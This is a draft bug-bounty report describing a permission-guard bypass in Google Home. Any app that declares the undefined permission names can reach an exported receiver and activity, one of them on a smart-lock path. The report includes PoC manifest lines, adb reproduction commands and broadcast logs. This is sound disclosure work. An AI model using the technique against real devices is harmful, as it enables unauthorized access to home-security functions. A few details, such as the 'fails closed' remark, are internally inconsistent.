# Submission draft — Google Home: exported receiver guarded by a permission that cannot exist

Paste target: https://bughunters.google.com/report (Android / Mobile VRP)
Status: READY. Evidence is Android's own broadcast history, reproducible in one command.

---

**Title:**
Google Home: two exported components are guarded by permissions that nothing on the
device defines, so any app can declare those names and reach both

---

Testing date: 2026-10-21
Testing time: 13:18 to 15:26 UTC (several runs)
Researcher IP: 180.148.212.54
Device: moto g stylus 5G (2024), Android 15 (API 35), stock, not rooted
App: com.google.android.apps.chromecast.app (Google Home), versionName=4.33.27.4
Tools: adb, jadx, aapt2, apksigner — plain AOSP build chain, nothing exotic
Attached PoC APK — mvrp-poc.apk, package com.cindrasec.mvrpprobe.
  Declares the two permission names below and nothing else. No real Android
  permission of any kind, so anything it can do, any app can do.
  sha256 a4ea40f5d42f5bb5c0a1adaf6367523d95da6a8c8dc6675c88e600e7c6815bba
Attached control APK — mvrp-control.apk, package com.cindrasec.mvrpctl.
  Built from the same source with the same key; its manifest declares no
  permissions at all. It is what the "SKIPPED" line below comes from.
  sha256 1aca408c964125ca446917f3e573d72b6066216a320bfc856214c5e232068020

Both APKs attached here are the exact files installed on the test device when
the output below was captured.

---

## The bug

Google Home's manifest declares:

```xml
<receiver
    android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver"
    android:permission="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
    android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED"/>
    </intent-filter>
</receiver>
```

`android:permission` takes one permission name. There are two here, joined with `|`.
Android does not split on `|`; it treats the whole string as a single permission name,
and no package on the device defines a permission called
`android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN`.

That breaks the guard in both directions:

Because no package defines that name, a third-party app can declare it itself at
`protectionLevel="normal"`, request it, and be granted it at install with no user prompt.
It then passes the check that every other unprivileged app fails.

I am deliberately not claiming anything about whether the receiver's intended deliveries
still work. Every `BLE_SCANNED` record in this device's broadcast history carries a
timestamp from my own test runs, and the account has no smart lock, so no legitimate
delivery was expected or observed. Reading the code, the app registers its scan callback
as a `PendingIntent`, which is dispatched under the app's own identity and so would not be
affected — but I did not test that, and I am not asserting it.

What I am asserting is only what the records show: the guard refuses ordinary apps, and an
app that declares the name itself is not refused.

## What I demonstrated

An app holding no real permissions can declare that name itself, be granted it at
install, and have its broadcast delivered to the receiver. An otherwise identical app
that does not declare it is refused by the system.

I built two APKs from the same source. The only difference is these two lines in one of
them:

```xml
<permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
            android:protectionLevel="normal" />
<uses-permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN" />
```

The attached PoC declares nothing else — no real Android permission of any kind — so
everything below is what an app with no capabilities at all can do. Both names are granted
at install, with no prompt and no entry anywhere in the UI, because neither is a real
permission:

```
$ adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'
    install permissions:
      android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN: granted=true
      com.google.android.settings.setup.dock.RUN_DOCK_SETUP: granted=true
```

Both apps then send the same broadcast: action
`com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED`,
component set to the receiver, extras `hgs_device_id`, `device_name`, `request_id` and a
one-element `ArrayList<ScanResult>` under `android.bluetooth.le.extra.LIST_SCAN_RESULT`.

The clearest evidence is Android's own broadcast history, which records the outcome and
the reason independently of anything either app logs. Both records below come from a
single `adb shell dumpsys activity broadcasts` taken after running each app once.

**App that declares the name — delivered, and the receiver ran:**

```
BroadcastRecord{6a3379c com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED
         flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
caller=com.cindrasec.mvrpprobe 19321:com.cindrasec.mvrpprobe/u0a568 pid=19321 uid=10568
dispatchTime=-4s78ms (+1ms since enq) finishTime=-4s69ms (+9ms since disp)
DELIVERED scheduled +2ms terminal +8ms (-1) #0: (manifest)
  ActivityInfo:
    name=com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver
    packageName=com.google.android.apps.chromecast.app
    enabled=true exported=true directBootAware=false
    permission=android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
  reason: remote app
```

**Identical app without the declaration — refused before dispatch:**

```
BroadcastRecord{5a4a12c com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED
         flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
caller=com.cindrasec.mvrpctl 24061:com.cindrasec.mvrpctl/u0a569 pid=24061 uid=10569
SKIPPED terminal (-1) #0: (manifest)
  ActivityInfo:
    name=com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver
    permission=android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
  reason: skipped by policy at enqueue: Permission Denial: broadcasting Intent {
    act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED flg=0x10
    cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
    from com.cindrasec.mvrpctl (pid=24061, uid=10569)
    to com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver
    requires android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
```

The system states the rule and the reason itself: the receiver requires that permission
name, the app that declared it passes, the app that did not is skipped at enqueue. The
declaration is the only difference between the two APKs.

The attached screenshot is a later run of the same two commands, filtered to the caller,
outcome and reason lines so both records fit on one screen. The per-run dispatch timings
differ by a few milliseconds, as they would; the outcomes do not.

Google Home's own process also logs a `BluetoothAdapter` line immediately after each
delivered broadcast — the Bluetooth check at the top of `onReceive` — and nothing after
the skipped ones. I repeated that comparison 15 times across three sessions, including a
third branch where nothing was sent at all, and the result was 15/15 for the app with the
declaration and 0/15 for both the control app and the silent branch.

## A second component in the same app, same technique

`LockProximityReceiver` is not the only one. The same sweep found
`com.google.android.apps.chromecast.app.titan.dock.activity.FirstDockActivity`,
exported and guarded by `com.google.android.settings.setup.dock.RUN_DOCK_SETUP`.
No package installed on this phone defines that permission, so nothing on it can hold
that guard. I have not identified which package is meant to define it — if it is present
on your test device this second example will not reproduce there, and the first one,
which cannot be defined anywhere, still stands on its own.

Adding that name to the same probe manifest, and starting the activity from each app:

```
# app that declares com.google.android.settings.setup.dock.RUN_DOCK_SETUP
I MVRP: STARTACT com.google.android.apps.chromecast.app/...titan.dock.activity.FirstDockActivity
I MVRP: startActivity() returned, no exception

# identical app that does not
W ActivityTaskManager: Permission Denial: starting Intent {
    flg=0x10000000 cmp=com.google.android.apps.chromecast.app/.titan.dock.activity.FirstDockActivity }
    from ProcessRecord{... com.cindrasec.mvrpctl/u0a569} (pid=24061, uid=10569)
    requires com.google.android.settings.setup.dock.RUN_DOCK_SETUP
I MVRP: SECURITY Permission Denial: ... requires com.google.android.settings.setup.dock.RUN_DOCK_SETUP
```

Reproduced twice, minutes apart. Two components, two different permissions, one app, the
same bypass — which is why I think the useful fix is an audit rather than a one-line
change.

The two have different reach. The malformed string can never be held on any device or OS
version, because it is not a permission name at all. `RUN_DOCK_SETUP` can be held on a
Pixel, where its defining package exists, and cannot be held anywhere else — so that guard
is absent on every non-Pixel Android device running this app.

For scope: across 66 decoded Google app manifests on this device there are 159 distinct
`android:permission` values, and exactly one contains a `|`. I am not claiming the typo is
widespread. The orphaned-guard pattern is the broader one: the same sweep found 16 guard
permissions that no installed package defines, two of them in this app.

## Why this is not just forward-compatibility noise

While testing I found a separate class of orphaned guard on this device that is *not*
worth your time, and I want to separate it out so this report is not read as that.

Several Google apps ship components guarded by API 36 permissions —
`android.permission.BIND_APP_FUNCTION_SERVICE` in Find My Device, Digital Wellbeing,
Pixel Buds and GMS, and `android.permission.BIND_ALTERNATIVE_MESSAGE_TRANSPORT_SERVICE`
in Google Messages. On this API 35 device those permission names are undefined, so they
can be claimed exactly as described above and the bind request is accepted. But the
services never start, because their base classes are also API 36 and absent:

```
package android.service.messaging;
public class AlternativeMessageTransportService extends Service {
    static { throw new NoClassDefFoundError(); }     // not present on API 35
}

public abstract class pj extends AppFunctionService   // android.app.appfunctions, same
```

So those are harmless today and resolve themselves when the device reaches Android 16.
I am not reporting them.

The two components in this report are different in kind. `LockProximityReceiver` and
`FirstDockActivity` are ordinary classes that load and run on this OS right now — I have
the receiver executing in Android's own record. Their guards are orphaned for reasons that
do not resolve with an OS update:

- `android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN` is a typo. It is not a
  permission name on any version of Android and never will be.
- `com.google.android.settings.setup.dock.RUN_DOCK_SETUP` is defined by no package on
  this device. I have not established which package is supposed to define it, so I am
  not claiming it is absent everywhere — only that it is absent here, and that an OS
  upgrade does not install a missing app. If it resolves on your test device, the first
  component alone carries the report, since that permission name cannot exist anywhere.

## Where this entry point leads

The following is read from the decompiled app. It is not something I performed.

`onReceive` takes `hgs_device_id`, `device_name`, `request_id` and the scan-result list
straight out of the intent with no caller check of any kind, and when the list is
non-empty it enqueues work named `tln_send_unlock_notification_worker`.
`LockProximityNotificationWorker` resolves the device id against the signed-in account
and, for a device with a lock trait, posts a notification on channel
`tln_unlock_notification_channel_id` whose tap target is `LockProximityUnlockActivity`,
carrying `hgs_device_id`, `request_id` and `manufacturer_data` through from the
broadcast. That activity enqueues `LockProximityUnlockWorker`, whose body is the unlock
call.

I did not reach that path. In my testing the handler returns before the list branch, and
I do not have a smart lock on the test account, so I could not supply a device id that
resolves server side. `LockProximityUnlockActivity` is `android:exported="false"`, so the
unlock cannot be invoked directly and would still require the user to tap the
notification.

What I am reporting is the guard, not the unlock: a component you intended to restrict is
reachable by any app, and it sits on the path to a physical lock.

## Impact

An unprivileged app installed by the user can invoke an internal Google Home component
that the manifest intends to protect, and make the app execute code on data the attacker
supplies. No user interaction and no prompt. Nothing in the app's permission list would
look unusual to a reviewer either, since the declared name is not a real permission and
so does not appear as a capability anywhere in the UI.

## Reproduction

```
adb install -r probe.apk      # declares and requests the malformed name
adb install -r control.apk    # identical source, declares nothing

adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'

# run each app once; each sends the broadcast described above
adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action blescan
adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity   --es action blescan

# then read the system's own record of both
adb shell dumpsys activity broadcasts | grep -B4 -A18 BLE_SCANNED
```

One record reads DELIVERED, the other SKIPPED with a Permission Denial naming the
malformed string. No logcat filtering, no timing, and nothing that depends on how the app
chooses to log.

Both APKs and their source are attached.

## Suggested fix

Replace the malformed attribute value with one real permission name, or drop
`android:permission` and check the caller inside `onReceive`. `android:permission` cannot
express "either of these two", so if that was the intent it has to live in code.

It would also be worth grepping the codebase for `android:permission` values containing
`|`. This kind of typo fails closed, so it looks like it is working — the feature quietly
stops receiving and the guard quietly stops guarding, and neither shows up in testing.

---

## Before sending

Take one screenshot of the terminal showing the `dumpsys activity broadcasts` output with
both records visible — the DELIVERED one and the SKIPPED one with its Permission Denial
reason. That single screen is the whole report.

Do not add a CVSS score argued upward. Do not describe the notification or the unlock as
something that happened. Every sentence above has a log line or a manifest line behind it,
and that is the only reason this is worth sending.
